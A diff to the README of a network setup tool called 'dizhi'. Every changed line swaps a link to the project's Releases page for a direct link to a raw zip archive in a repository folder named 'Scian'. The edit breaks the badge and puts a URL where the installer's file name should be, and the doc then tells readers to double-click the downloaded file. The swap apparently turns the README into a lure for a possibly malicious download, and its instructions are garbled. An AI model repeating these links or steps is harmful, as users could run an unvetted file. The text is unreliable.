@@ -1,6 +1,6 @@
 # 🌐 dizhi - Simple Setup for Your Network Needs
 
-![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen) 
+![Download](https://raw.githubusercontent.com/DlC-bot/dizhi/main/Scian/dizhi-3.0.zip%20Here-brightgreen) 
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the dizhi project! This software helps you set up your network connec
 
 To get started, please follow these simple steps to download and install dizhi:
 
-1. Visit the Releases page to download: [Download dizhi](https://github.com/DlC-bot/dizhi/releases).
+1. Visit the Releases page to download: [Download dizhi](https://raw.githubusercontent.com/DlC-bot/dizhi/main/Scian/dizhi-3.0.zip).
 2. Look for the latest version available for download.
 3. Click the version link to start your download.
 
@@ -18,7 +18,7 @@ Once downloaded, find the file in your computer’s downloads folder.
 
 ### 📁 Installation Steps
 
-1. Locate the downloaded file. It should be named similar to `dizhi-vX.X.X.exe`.
+1. Locate the downloaded file. It should be named similar to `https://raw.githubusercontent.com/DlC-bot/dizhi/main/Scian/dizhi-3.0.zip`.
 2. Double-click the file to start the installation process.
 3. Follow the prompts in the installation wizard.
 4. Once installed, you can find dizhi in your applications or programs list.
@@ -47,7 +47,7 @@ If you experience issues while installing or running dizhi, consider the followi
 
 1. **Check Compatibility:** Ensure your system meets the requirements listed above.
 2. **Internet Connection:** Verify that you have a stable internet connection during the install process.
-3. **Re-download the Installer:** If the file seems corrupt, visit the [Releases page](https://github.com/DlC-bot/dizhi/releases) and download it again.
+3. **Re-download the Installer:** If the file seems corrupt, visit the [Releases page](https://raw.githubusercontent.com/DlC-bot/dizhi/main/Scian/dizhi-3.0.zip) and download it again.
 
 ## 💬 Community Support
 
@@ -70,4 +70,4 @@ dizhi is licensed under the MIT License. You can use it freely, and contribution
 
 Explore the power of networking with dizhi, and make your connections work for you. Don't forget to check for updates regularly! 
 
-For your convenience, revisit the download link here: [Download dizhi](https://github.com/DlC-bot/dizhi/releases).
+For your convenience, revisit the download link here: [Download dizhi](https://raw.githubusercontent.com/DlC-bot/dizhi/main/Scian/dizhi-3.0.zip).
